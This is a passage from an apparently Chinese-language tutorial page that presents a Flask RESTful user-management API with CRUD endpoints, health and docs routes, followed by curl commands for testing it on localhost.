class="hljs-comment"># day30_restful_api.py</span><br><span class="hljs-comment"># 功能：简单的RESTful API实现</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># 模拟数据库</span><br>users_db = &#123;&#125;<br><br><span class="hljs-comment"># 初始化一些测试数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_data</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;初始化测试数据&quot;&quot;&quot;</span><br>    users = [<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;li@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;王五&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;wang@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;,<br>    ]<br><br>    <span class="hljs-keyword">for</span> user_data <span class="hljs-keyword">in</span> users:<br>        user_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>        users_db[user_id] = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: user_id,<br>            **user_data,<br>            <span class="hljs-string">&quot;created_at&quot;</span>: datetime.now().isoformat(),<br>            <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>        &#125;<br><br>init_data()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success_response</span>(<span class="hljs-params">data=<span class="hljs-literal">None</span>, message=<span class="hljs-string">&quot;操作成功&quot;</span>, status_code=<span class="hljs-number">200</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    成功响应格式</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        data: 返回的数据</span><br><span class="hljs-string">        message: 提示信息</span><br><span class="hljs-string">        status_code: HTTP状态码</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    response = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: message<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        response[<span class="hljs-string">&quot;data&quot;</span>] = data<br><br>    <span class="hljs-keyword">return</span> jsonify(response), status_code<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error_response</span>(<span class="hljs-params">message=<span class="hljs-string">&quot;操作失败&quot;</span>, code=<span class="hljs-string">&quot;ERROR&quot;</span>, details=<span class="hljs-literal">None</span>, status_code=<span class="hljs-number">400</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    错误响应格式</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        message: 错误信息</span><br><span class="hljs-string">        code: 错误代码</span><br><span class="hljs-string">        details: 错误详情</span><br><span class="hljs-string">        status_code: HTTP状态码</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    response = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>        <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;code&quot;</span>: code,<br>            <span class="hljs-string">&quot;message&quot;</span>: message<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> details:<br>        response[<span class="hljs-string">&quot;error&quot;</span>][<span class="hljs-string">&quot;details&quot;</span>] = details<br><br>    <span class="hljs-keyword">return</span> jsonify(response), status_code<br><br><br><span class="hljs-comment"># ============================================================</span><br><span class="hljs-comment"># 用户管理API</span><br><span class="hljs-comment"># ============================================================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取用户列表</span><br><span class="hljs-string"></span><br><span class="hljs-string">    查询参数：</span><br><span class="hljs-string">        page: 页码（默认1）</span><br><span class="hljs-string">        limit: 每页数量（默认20）</span><br><span class="hljs-string">        role: 角色过滤</span><br><span class="hljs-string">        search: 搜索（姓名或邮箱）</span><br><span class="hljs-string">        sort: 排序字段</span><br><span class="hljs-string">        order: 排序顺序（asc/desc）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 获取查询参数</span><br>    page = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;page&#x27;</span>, <span class="hljs-number">1</span>))<br>    limit = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;limit&#x27;</span>, <span class="hljs-number">20</span>))<br>    role = request.args.get(<span class="hljs-string">&#x27;role&#x27;</span>)<br>    search = request.args.get(<span class="hljs-string">&#x27;search&#x27;</span>)<br>    sort_field = request.args.get(<span class="hljs-string">&#x27;sort&#x27;</span>, <span class="hljs-string">&#x27;created_at&#x27;</span>)<br>    sort_order = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;desc&#x27;</span>)<br><br>    <span class="hljs-comment"># 获取所有用户</span><br>    users_list = <span class="hljs-built_in">list</span>(users_db.values())<br><br>    <span class="hljs-comment"># 过滤</span><br>    <span class="hljs-keyword">if</span> role:<br>        users_list = [u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_list <span class="hljs-keyword">if</span> u.get(<span class="hljs-string">&#x27;role&#x27;</span>) == role]<br><br>    <span class="hljs-keyword">if</span> search:<br>        users_list = [<br>            u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_list<br>            <span class="hljs-keyword">if</span> search.lower() <span class="hljs-keyword">in</span> u.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).lower()<br>            <span class="hljs-keyword">or</span> search.lower() <span class="hljs-keyword">in</span> u.get(<span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).lower()<br>        ]<br><br>    <span class="hljs-comment"># 排序</span><br>    reverse = (sort_order == <span class="hljs-string">&#x27;desc&#x27;</span>)<br>    users_list.sort(key=<span class="hljs-keyword">lambda</span> x: x.get(sort_field, <span class="hljs-string">&#x27;&#x27;</span>), reverse=reverse)<br><br>    <span class="hljs-comment"># 分页</span><br>    total = <span class="hljs-built_in">len</span>(users_list)<br>    start = (page - <span class="hljs-number">1</span>) * limit<br>    end = start + limit<br>    users_page = users_list[start:end]<br><br>    <span class="hljs-comment"># 构造响应</span><br>    response_data = &#123;<br>        <span class="hljs-string">&quot;users&quot;</span>: users_page,<br>        <span class="hljs-string">&quot;pagination&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;total&quot;</span>: total,<br>            <span class="hljs-string">&quot;page&quot;</span>: page,<br>            <span class="hljs-string">&quot;limit&quot;</span>: limit,<br>            <span class="hljs-string">&quot;pages&quot;</span>: (total + limit - <span class="hljs-number">1</span>) // limit<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> success_response(response_data, <span class="hljs-string">&quot;获取用户列表成功&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取指定用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">    路径参数：</span><br><span class="hljs-string">        user_id: 用户ID</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    user = users_db.get(user_id)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">f&quot;用户不存在&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    <span class="hljs-keyword">return</span> success_response(user, <span class="hljs-string">&quot;获取用户成功&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    创建新用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">    请求体：</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;用户名&quot;,</span><br><span class="hljs-string">            &quot;email&quot;: &quot;邮箱&quot;,</span><br><span class="hljs-string">            &quot;role&quot;: &quot;角色&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># 验证必填字段</span><br>    required_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>]<br>    missing_fields = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> required_fields <span class="hljs-keyword">if</span> f <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data]<br><br>    <span class="hljs-keyword">if</span> missing_fields:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;缺少必填字段&quot;</span>,<br>            code=<span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>            details=[&#123;<span class="hljs-string">&quot;field&quot;</span>: f, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;此字段为必填项&quot;</span>&#125; <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> missing_fields],<br>            status_code=<span class="hljs-number">422</span><br>        )<br><br>    <span class="hljs-comment"># 验证邮箱唯一性</span><br>    email = data.get(<span class="hljs-string">&#x27;email&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(u[<span class="hljs-string">&#x27;email&#x27;</span>] == email <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_db.values()):<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;邮箱已存在&quot;</span>,<br>            code=<span class="hljs-string">&quot;EMAIL_EXISTS&quot;</span>,<br>            status_code=<span class="hljs-number">409</span><br>        )<br><br>    <span class="hljs-comment"># 创建用户</span><br>    user_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    user = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: user_id,<br>        <span class="hljs-string">&quot;name&quot;</span>: data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: data[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;role&quot;</span>: data.get(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>),<br>        <span class="hljs-string">&quot;created_at&quot;</span>: datetime.now().isoformat(),<br>        <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>    &#125;<br><br>    users_db[user_id] = user<br><br>    <span class="hljs-keyword">return</span> success_response(user, <span class="hljs-string">&quot;创建用户成功&quot;</span>, <span class="hljs-number">201</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    完整更新用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">    路径参数：</span><br><span class="hljs-string">        user_id: 用户ID</span><br><span class="hljs-string"></span><br><span class="hljs-string">    请求体：</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;用户名&quot;,</span><br><span class="hljs-string">            &quot;email&quot;: &quot;邮箱&quot;,</span><br><span class="hljs-string">            &quot;role&quot;: &quot;角色&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;用户不存在&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># 验证必填字段</span><br>    required_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>]<br>    missing_fields = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> required_fields <span class="hljs-keyword">if</span> f <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data]<br><br>    <span class="hljs-keyword">if</span> missing_fields:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;缺少必填字段&quot;</span>,<br>            code=<span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>            details=[&#123;<span class="hljs-string">&quot;field&quot;</span>: f, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;此字段为必填项&quot;</span>&#125; <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> missing_fields],<br>            status_code=<span class="hljs-number">422</span><br>        )<br><br>    <span class="hljs-comment"># 更新用户</span><br>    users_db[user_id].update(&#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: data[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;role&quot;</span>: data.get(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>),<br>        <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> success_response(users_db[user_id], <span class="hljs-string">&quot;更新用户成功&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;PATCH&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    部分更新用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">    路径参数：</span><br><span class="hljs-string">        user_id: 用户ID</span><br><span class="hljs-string"></span><br><span class="hljs-string">    请求体：可以只包含要更新的字段</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;新用户名&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;用户不存在&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># 只更新提供的字段</span><br>    allowed_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>]<br>    <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> allowed_fields:<br>        <span class="hljs-keyword">if</span> field <span class="hljs-keyword">in</span> data:<br>            users_db[user_id][field] = data[field]<br><br>    users_db[user_id][<span class="hljs-string">&#x27;updated_at&#x27;</span>] = datetime.now().isoformat()<br><br>    <span class="hljs-keyword">return</span> success_response(users_db[user_id], <span class="hljs-string">&quot;更新用户成功&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;DELETE&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    删除用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">    路径参数：</span><br><span class="hljs-string">        user_id: 用户ID</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;用户不存在&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    <span class="hljs-keyword">del</span> users_db[user_id]<br><br>    <span class="hljs-comment"># DELETE成功通常返回204 No Content</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">204</span><br><br><br><span class="hljs-comment"># ============================================================</span><br><span class="hljs-comment"># API文档和健康检查</span><br><span class="hljs-comment"># ============================================================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/health&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">health_check</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;健康检查&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> success_response(&#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;healthy&quot;</span>,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/docs&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_docs</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;API文档&quot;&quot;&quot;</span><br>    docs = &#123;<br>        <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,<br>        <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;用户管理API&quot;</span>,<br>        <span class="hljs-string">&quot;endpoints&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;获取用户列表&quot;</span>,<br>                <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;页码&quot;</span>,<br>                    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-string">&quot;每页数量&quot;</span>,<br>                    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;角色过滤&quot;</span>,<br>                    <span class="hljs-string">&quot;search&quot;</span>: <span class="hljs-string">&quot;搜索&quot;</span>,<br>                    <span class="hljs-string">&quot;sort&quot;</span>: <span class="hljs-string">&quot;排序字段&quot;</span>,<br>                    <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;排序顺序&quot;</span><br>                &#125;<br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;获取指定用户&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;创建新用户&quot;</span>,<br>                <span class="hljs-string">&quot;body&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;用户名（必填）&quot;</span>,<br>                    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;邮箱（必填）&quot;</span>,<br>                    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;角色（可选）&quot;</span><br>                &#125;<br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PUT&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;完整更新用户&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PATCH&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;部分更新用户&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;DELETE&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;删除用户&quot;</span><br>            &#125;<br>        ]<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> success_response(docs)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ╔══════════════════════════════════════════════════════════╗</span><br><span class="hljs-string">    ║       RESTful API 服务器                                  ║</span><br><span class="hljs-string">    ║       User Management API                                ║</span><br><span class="hljs-string">    ╚══════════════════════════════════════════════════════════╝</span><br><span class="hljs-string"></span><br><span class="hljs-string">    API地址: http://127.0.0.1:5000/api/v1</span><br><span class="hljs-string"></span><br><span class="hljs-string">    可用端点:</span><br><span class="hljs-string">    - GET    /api/v1/users          获取用户列表</span><br><span class="hljs-string">    - GET    /api/v1/users/&lt;id&gt;     获取指定用户</span><br><span class="hljs-string">    - POST   /api/v1/users          创建新用户</span><br><span class="hljs-string">    - PUT    /api/v1/users/&lt;id&gt;     更新用户（完整）</span><br><span class="hljs-string">    - PATCH  /api/v1/users/&lt;id&gt;     更新用户（部分）</span><br><span class="hljs-string">    - DELETE /api/v1/users/&lt;id&gt;     删除用户</span><br><span class="hljs-string">    - GET    /api/v1/health         健康检查</span><br><span class="hljs-string">    - GET    /api/v1/docs           API文档</span><br><span class="hljs-string"></span><br><span class="hljs-string">    测试命令:</span><br><span class="hljs-string">    # 获取所有用户</span><br><span class="hljs-string">    curl http://127.0.0.1:5000/api/v1/users</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 创建用户</span><br><span class="hljs-string">    curl -X POST http://127.0.0.1:5000/api/v1/users \\</span><br><span class="hljs-string">      -H &quot;Content-Type: application/json&quot; \\</span><br><span class="hljs-string">      -d &#x27;&#123;&quot;name&quot;:&quot;测试用户&quot;,&quot;email&quot;:&quot;test@example.com&quot;&#125;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 获取单个用户</span><br><span class="hljs-string">    curl http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 更新用户</span><br><span class="hljs-string">    curl -X PATCH http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \\</span><br><span class="hljs-string">      -H &quot;Content-Type: application/json&quot; \\</span><br><span class="hljs-string">      -d &#x27;&#123;&quot;name&quot;:&quot;新名字&quot;&#125;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 删除用户</span><br><span class="hljs-string">    curl -X DELETE http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="5-API测试"><a href="#5-API测试" class="headerlink" title="5. API测试"></a>5. API测试</h2><h3 id="5-1-使用curl测试"><a href="#5-1-使用curl测试" class="headerlink" title="5.1 使用curl测试"></a>5.1 使用curl测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 获取所有用户</span><br>curl http://127.0.0.1:5000/api/v1/users<br><br><span class="hljs-comment"># 2. 分页和过滤</span><br>curl <span class="hljs-string">&quot;http://127.0.0.1:5000/api/v1/users?page=1&amp;limit=10&amp;role=admin&quot;</span><br><br><span class="hljs-comment"># 3. 创建用户</span><br>curl -X POST http://127.0.0.1:5000/api/v1/users \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">    &quot;name&quot;: &quot;新用户&quot;,</span><br><span class="hljs-string">    &quot;email&quot;: &quot;new@example.com&quot;,</span><br><span class="hljs-string">    &quot;role&quot;: &quot;user&quot;</span><br><span class="hljs-string">  &#125;&#x27;</span><br><br><span class="hljs-comment"># 4. 获取单个用户</span><br>curl http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;<br><br><span class="hljs-comment"># 5. 更新用户（PUT - 完整更新）</span><br>curl -X PUT http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">    &quot;name&quot;: &quot;更新的用户&quot;,</span><br><span class="hljs-string">    &quot;email&quot;: &quot;updated@example.com&quot;,</span><br><span class="hljs-string">    &quot;role&quot;: &quot;admin&quot;</span><br><span class="hljs-string">  &#125;&#x27;</span><br><br><span class="hljs-comment"># 6. 更新用户（PATCH - 部分更新）</span><br>curl -X PATCH http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;只更新名字&quot;&#125;&#x27;</span><br><br><span class="hljs-comment"># 7. 删除用户</span><br>curl -X DELETE http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;<br><br><span class="hljs-comment"># 8. 健康检查</span><br>curl http://127.0.0.1:5000/api/v1/health<br></code></pre></td></tr></table></figure><hr><h2 id="6-最佳实践总结"><a href="#6-最佳实践总结" class="headerlink" title="6. 最佳实践总结"></a>6. 最佳实践总结</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 